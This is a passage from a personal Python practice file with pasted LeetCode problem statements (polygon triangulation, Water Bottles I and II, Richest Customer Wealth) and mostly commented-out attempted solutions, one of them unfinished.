Explanation: The polygon is already triangulated, and the score of the only triangle is 6.

Example 2:
Input: values = [3,7,4,5]
Output: 144
Explanation: There are two triangulations, with possible scores: 3*7*5 + 4*5*7 = 245, or 3*4*5 + 3*4*7 = 144.
The minimum score is 144.

Example 3:
Input: values = [1,3,1,4,1,5]
Output: 13
Explanation: The minimum score triangulation is 1*1*3 + 1*1*4 + 1*1*5 + 1*1*1 = 13.

Constraints:
n == values.length
3 <= n <= 50
1 <= values[i] <= 100'''


# class Solution:
#     def minScoredTriangulation(self,value):
#         if len(value) == 3:
#             for i in range(len(value)-2):
#                 return value(i)+value(i+1)+value(i+2)
    

# obj = Solution()
# value =[1,3,1,4,1,5]
# # values = [3,7,4,5]
# # values = [1,2,3]
# a = obj.minScoredTriangulation(value)


"""1518. Water Bottles
Attempted
Easy
Topics
premium lock icon
Companies
Hint
There are numBottles water bottles that are initially full of water. You can exchange numExchange empty water bottles from the market with one full water bottle.

The operation of drinking a full water bottle turns it into an empty bottle.

Given the two integers numBottles and numExchange, return the maximum number of water bottles you can drink.

 

Example 1:


Input: numBottles = 9, numExchange = 3
Output: 13
Explanation: You can exchange 3 empty bottles to get 1 full water bottle.
Number of water bottles you can drink: 9 + 3 + 1 = 13.
Example 2:


Input: numBottles = 15, numExchange = 4
Output: 19
Explanation: You can exchange 4 empty bottles to get 1 full water bottle. 
Number of water bottles you can drink: 15 + 3 + 1 = 19.
"""
# class Solution:
#     def numWaterBottles(self, numBottles, numExchange):
#         total_drunk = numBottles   # start with initial bottles
#         empty = numBottles         # all are empty after drinking
#         while empty >= numExchange:
#             new_bottle = empty // numExchange
#             print(new_bottle,'neww bottlessssssssss')
#             total_drunk += new_bottle
#             print(total_drunk, "total_drunk")
            
#             empty = empty % numExchange + new_bottle
#             print(empty,'emptyyyyyyyyyyyyyyyyyyyyyyyyyy')

#         return total_drunk 

# ob = Solution()
# print(ob.numWaterBottles(9, 3))   # expected 13
# # print(ob.numWaterBottles(15, 4))  # expected 19
# # print(ob.numWaterBottles(5, 5))

# lc 3100
'''3100. Water Bottles II
Medium
Topics
premium lock icon
Companies
Hint
You are given two integers numBottles and numExchange.

numBottles represents the number of full water bottles that you initially have. In one operation, you can perform one of the following operations:

Drink any number of full water bottles turning them into empty bottles.
Exchange numExchange empty bottles with one full water bottle. Then, increase numExchange by one.
Note that you cannot exchange multiple batches of empty bottles for the same value of numExchange. For example, if numBottles == 3 and numExchange == 1, you cannot exchange 3 empty water bottles for 3 full bottles.

Return the maximum number of water bottles you can drink.

 

Example 1:


Input: numBottles = 13, numExchange = 6
Output: 15
Explanation: The table above shows the number of full water bottles, empty water bottles, the value of numExchange, and the number of bottles drunk.
Example 2:


Input: numBottles = 10, numExchange = 3
Output: 13
Explanation: The table above shows the number of full water bottles, empty water bottles, the value of numExchange, and the number of bottles drunk.
 

Constraints:

1 <= numBottles <= 100 
1 <= numExchange <= 100'''


# class Solution:
#     def maxBottleDrunk(self,numBottle,numExchange):
#         drunk_bottle = numBottle
#         empty_bottle = numBottle

#         while empty_bottle >= numExchange:
#             empty_bottle -= numExchange
#             drunk_bottle +=1
#             numExchange +=1
#         #     print(numExchange)
#             empty_bottle +=1

#         return drunk_bottle
    


# obj = Solution()
# # print(obj.maxBottleDrunk(13,6))
# print(obj.maxBottleDrunk(10,3))


# lc 1672

"""1672. Richest Customer Wealth
Solved
Easy
Topics
premium lock icon
Companies
Hint
You are given an m x n integer grid accounts where accounts[i][j] is the amount of money the i​​​​​​​​​​​th​​​​ customer has in the j​​​​​​​​​​​th​​​​ bank. Return the wealth that the richest customer has.

A customer's wealth is the amount of money they have in all their bank accounts. The richest customer is the customer that has the maximum wealth.

 

Example 1:

Input: accounts = [[1,2,3],[3,2,1]]
Output: 6
Explanation:
1st customer has wealth = 1 + 2 + 3 = 6
2nd customer has wealth = 3 + 2 + 1 = 6
Both customers are considered the richest with a wealth of 6 each, so return 6.
Example 2:

Input: accounts = [[1,5],[7,3],[3,5]]
Output: 10
Explanation: 
1st customer has wealth = 6
2nd customer has wealth = 10 
3rd customer has wealth = 8
The 2nd customer is the richest with a wealth of 10.
Example 3:

Input: accounts = [[2,8,7],[7,1,3],[1,9,5]]
Output: 17"""
# class Solution:
    

#     def richestCustomer(self,acc):
#         arr = []
#         val = 0
#         for i in acc:
#             val = 0
#             for j in range(len(i)):
#                 val += i[j]
#                 if j+1 == len(i):
#                         arr.append(val)
                
#         return max(arr)

# obj =Solution()
# print(obj.richestCustomer([[1,2,3],[3,2,1]]))
# # print(obj.richestCustomer([[1,5],[7,3],[3,5]]))

candies = [2,3,5,1,3]


# lar = sorted(candies)[-1]

# lar = max(candies)

# print(lar)


from typing import Counter
s = "programming"

# Input: s = "programming"

mp = Counter(s)

print(mp)